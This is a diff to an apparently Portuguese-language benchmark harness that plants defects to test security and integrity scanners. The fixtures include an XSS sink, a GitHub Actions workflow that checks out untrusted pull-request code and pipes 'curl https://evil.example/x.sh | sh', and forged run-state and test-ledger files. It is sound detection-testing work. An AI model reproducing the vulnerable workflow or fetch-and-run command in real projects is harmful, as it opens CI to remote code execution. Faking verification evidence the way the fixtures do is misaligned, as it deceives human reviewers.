@@ -86,8 +86,12 @@ def build_corpus(t: Path):
         "    try:\n        raise ValueError('x')\n"
         "    except Exception:\n        pass\n", encoding="utf-8")
     # D9: teste legítimo (controle de falso-positivo)
+    # NOTA: `assert 1 + 1 == 2` é tautologia — o assertless corretamente não
+    # conta constante como asserção. O controle precisa de binding real.
     (proj / "tests" / "test_real.py").write_text(
-        "def test_soma():\n    assert 1 + 1 == 2\n", encoding="utf-8")
+        "def test_soma():\n"
+        "    def soma(a, b):\n        return a + b\n"
+        "    assert soma(1, 1) == 2\n", encoding="utf-8")
 
     # D2: função monstro sem cobertura
     monster = ["def monstro(x):"]
@@ -425,12 +429,98 @@ def run(suite: Suite):
             record("D17 Multi-Cloud IaC (AWS IAM wildcard + GCP allUsers/owner)", "NO-INSTRUMENT")
             record("D18 Pentest Red Team (IDOR sem ownership + SSRF + JWT decode + CORS '*'+cred)", "NO-INSTRUMENT")
 
+        # --- D19..D24 + C4: Wave 5 (Banca Adversarial v4.0) ---
+        (proj / "src" / "ui" / "xssScope.ts").write_text(
+            "export function cleanHelper(s: string) { return DOMPurify.sanitize(s); }\n"
+            "export function renderUnsafe(el: any, html: string) { el.innerHTML = html; }\n",
+            encoding="utf-8")
+        wf_bench = proj / ".github" / "workflows"
+        wf_bench.mkdir(parents=True, exist_ok=True)
+        (wf_bench / "ci_vuln.yml").write_text(
+            "on: [pull_request_target]\n"
+            "jobs:\n  pwn:\n    runs-on: ubuntu-latest\n    steps:\n"
+            "      - uses: actions/checkout@v4\n"
+            "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
+            "      - run: curl -sSL https://evil.example/x.sh | sh\n",
+            encoding="utf-8")
+        if suite.has("scripts", "metricas", "hazard_scan.py"):
+            code, out_d19 = suite.run_gate("scripts", "metricas", "hazard_scan.py",
+                                           args=(proj / "src" / "ui" / "xssScope.ts",))
+            record("D19 XSS em função B com DOMPurify apenas na função A (escopo intraprocedural)",
+                   "DETECTED" if (code == 1 and "XSS-RAW-HTML" in out_d19) else "MISSED")
+            code, out_d20 = suite.run_gate("scripts", "metricas", "hazard_scan.py",
+                                           args=(wf_bench / "ci_vuln.yml",))
+            record("D20 GitHub Actions pull_request_target + checkout head + curl|sh",
+                   "DETECTED" if (code == 1 and "CI-PWN-REQUEST" in out_d20 and "CI-CURL-PIPE-SH" in out_d20) else "MISSED")
+        else:
+            record("D19 XSS em função B com DOMPurify apenas na função A (escopo intraprocedural)", "NO-INSTRUMENT")
+            record("D20 GitHub Actions pull_request_target + checkout head + curl|sh", "NO-INSTRUMENT")
+
+        (proj / "conftest.py").write_text("# untracked conftest injection\n", encoding="utf-8")
+        if suite.has("scripts", "metricas", "metaconfig_diff.py"):
+            code, out_d21 = suite.run_gate("scripts", "metricas", "metaconfig_diff.py",
+                                           args=("--repo", proj, "--against", "HEAD"))
+            record("D21 conftest.py untracked (??) injetado fora da spec",
+                   "DETECTED" if (code == 1 and "conftest.py" in out_d21) else "MISSED")
+        else:
+            record("D21 conftest.py untracked (??) injetado fora da spec", "NO-INSTRUMENT")
+
+        (proj / "src" / "ui" / "BadA11y.tsx").write_text(
+            "export const B = () => <button>Salvar <span className='sr-only'>Salvar</span></button>;\n",
+            encoding="utf-8")
+        (proj / "src" / "ui" / "GoodA11y.tsx").write_text(
+            "export const G = () => <button aria-label='Salvar'><svg /></button>;\n",
+            encoding="utf-8")
+        if suite.has("scripts", "metricas", "a11y_scan.py"):
+            code, _ = suite.run_gate("scripts", "metricas", "a11y_scan.py",
+                                     args=(proj / "src" / "ui" / "BadA11y.tsx",))
+            record("D22 Fraude de acessibilidade .sr-only duplicado em componente .tsx",
+                   {1: "DETECTED", 0: "MISSED"}.get(code, f"ERROR:{code}"))
+            code, _ = suite.run_gate("scripts", "metricas", "a11y_scan.py",
+                                     args=(proj / "src" / "ui" / "GoodA11y.tsx",))
+            record("C4 Botão de ícone com aria-label legítimo no a11y_scan (controle)",
+                   {0: "APPROVED", 1: "FALSE-RED"}.get(code, f"ERROR:{code}"), control=True)
+        else:
+            record("D22 Fraude de acessibilidade .sr-only duplicado em componente .tsx", "NO-INSTRUMENT")
+
+        forged_run = t / "forged_run.json"
+        forged_run.write_text(json.dumps({
+            "run_id": "bench-forged",
+            "mode": "EXECUTAR",
+            "archetype": "CARPINTEIRO",
+            "outcome": "verified",
+            "gates": {"hazard_scan": {"exit_code": 1}}
+        }), encoding="utf-8")
+        if suite.has("scripts", "run_state.py"):
+            code, out_d23 = suite.run_gate("scripts", "run_state.py",
+                                           args=("verify", forged_run))
+            record("D23 Run state com outcome=verified forjado sobre portão reprovado",
+                   "DETECTED" if (code == 1 and ("STATE-DERIVED-CONFLICT" in out_d23
+                                                or "RUN-ERROR" in out_d23)) else "MISSED")
+        else:
+            record("D23 Run state com outcome=verified forjado sobre portão reprovado", "NO-INSTRUMENT")
+
+        forged_ledger = t / "forged_ledger.json"
+        forged_ledger.write_text(json.dumps([
+            {"cmd": "pytest -q", "exit": 0, "testes_descobertos": 42}
+        ]), encoding="utf-8")
+        if suite.has("scripts", "audit_ledger.py"):
+            code, out_d24 = suite.run_gate("scripts", "audit_ledger.py",
+                                           args=("--ledger", forged_ledger, "--require-exec-log",
+                                                 "--exec-log", t / "nonexistent_exec_log.jsonl"))
+            record("D24 Ledger com contagem de testes auto-declarada sem exec_log.jsonl",
+                   "DETECTED" if (code == 1 and "UNVERIFIED_EXECUTION_EVIDENCE" in out_d24) else "MISSED")
+        else:
+            record("D24 Ledger com contagem de testes auto-declarada sem exec_log.jsonl", "NO-INSTRUMENT")
+
     return rows
 
 
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--suite-dir", required=True, help="checkout da suíte a medir")
+    ap.add_argument("--strict", action="store_true",
+                    help="CI: exit 1 se houver MISSED, ERROR:* ou FALSE-RED")
     args = ap.parse_args()
     suite = Suite(Path(args.suite_dir).resolve())
     if not (suite.root / "scripts").is_dir():
@@ -462,6 +552,17 @@ def main():
               f"({100*det/instrumented:.0f}%)")
     print(f"Cobertura instrumental: {instrumented}/{len(defects)} defeitos "
           f"({100*instrumented/len(defects):.0f}%)")
+
+    if args.strict:
+        # DS-11: NO-INSTRUMENT tem que reprovar — remover um scanner do corpus
+        # deixava a CI verde contando zero recall sobre zero instrumentados.
+        bad = miss + err + fred + noins
+        if bad:
+            print(f"\n--strict: {bad} não-conformidade(s) "
+                  f"({miss} MISSED · {err} ERROR · {fred} FALSE-RED · "
+                  f"{noins} NO-INSTRUMENT) — reprovado.")
+            sys.exit(1)
+        print("\n--strict: nenhum MISSED/ERROR/FALSE-RED/NO-INSTRUMENT — aprovado.")
 
 
 if __name__ == "__main__":
